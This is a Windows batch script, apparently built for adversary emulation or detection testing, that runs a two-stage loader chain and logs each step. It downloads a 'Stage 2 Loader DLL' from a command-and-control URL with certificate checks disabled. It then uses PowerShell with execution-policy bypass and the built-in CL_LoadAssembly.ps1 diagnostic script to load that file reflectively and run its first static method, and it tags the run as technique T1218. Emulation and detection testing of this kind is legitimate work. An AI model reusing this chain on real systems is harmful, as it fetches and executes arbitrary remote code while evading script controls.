@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations
SET randomname1=%APPDATA%\10878\2f5aeb7a
SET randomname2=28f86b32.txt
SET randomname3=https://10.0.0.49/stage/2/icon.png?10878-7
SET randomname4=ITZEL-S2B
SET randomname5=10878
SET randomname6=7
SET randomname7=%PUBLIC%\\macula-simulations.log

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM Initialize result tracking
SET result=OK
SET errdetail=

REM ---- Debug: heartbeat start ----
echo [!tsvar!][DEBUG][!randomname4!][!randomname5!]: heartbeat_start>> "!randomname7!" 2>nul

REM 1. Download Stage 2 Loader DLL from C2 via heartbeat
curl -k -s -o "!randomname1!\!randomname2!" "!randomname3!" 2>> "!randomname7!"
IF NOT !ERRORLEVEL! EQU 0 (
    SET result=FAIL
    SET errdetail=curl_failed
)

REM ---- Debug: heartbeat complete ----
echo [!tsvar!][DEBUG][!randomname4!][!randomname5!]: heartbeat_complete>> "!randomname7!" 2>nul

REM ---- Debug: chdir start ----
echo [!tsvar!][DEBUG][!randomname4!][!randomname5!]: chdir_start>> "!randomname7!" 2>nul

REM 2. Change working directory to %APPDATA%\10878\2f5aeb7a
cd /d "!randomname1!" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (
    SET result=FAIL
    SET errdetail=chdir_failed
)

REM ---- Debug: chdir result ----
echo [!tsvar!][DEBUG][!randomname4!][!randomname5!]: chdir_result=!ERRORLEVEL!>> "!randomname7!" 2>nul

REM ---- Debug: process start for powershell ----
echo [!tsvar!][DEBUG][!randomname4!][!randomname5!]: process_start=powershell>> "!randomname7!" 2>nul

REM 3. Invoke Stage 2 Loader DLL via LOLBIN (PowerShell)
powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath %APPDATA%\10878\2f5aeb7a\28f86b32.txt; $a=[AppDomain]::CurrentDomain.GetAssemblies()|Select -Last 1; ($a.GetExportedTypes()|%{$_.GetMethods([Reflection.BindingFlags]'Public,Static')|?{$_.GetParameters().Count -eq 0}}|Select -First 1).Invoke($null,$null)"
IF NOT !ERRORLEVEL! EQU 0 (
    SET result=FAIL
    SET errdetail=powershell_failed
)

REM ---- Debug: DLL load (via powershell) ----
echo [!tsvar!][DEBUG][!randomname4!][!randomname5!]: dll_load>> "!randomname7!" 2>nul

REM 4. Log the LOLBIN invocation result (TTP)
echo [!tsvar!][TTP][!randomname4!][!randomname5!]: T1218|System Binary Proxy Execution=!result!:!errdetail!>> "!randomname7!" 2>nul

endlocal